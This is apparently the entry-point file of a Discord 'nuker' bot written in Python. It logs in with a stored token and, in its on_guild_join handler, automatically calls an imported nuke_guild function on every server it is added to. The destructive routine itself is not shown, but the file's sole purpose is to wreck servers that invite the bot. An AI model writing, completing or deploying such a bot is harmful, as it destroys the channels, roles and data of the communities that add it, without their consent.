import discord
from cfg import bot_data
from functions import client, nuke_guild
from logs import write_log


@client.event
async def on_ready():
    await write_log(f"Bot is starting...")


@client.event
async def on_guild_join(guild: discord.Guild):
    await nuke_guild(guild)


client.run(bot_data['token'])
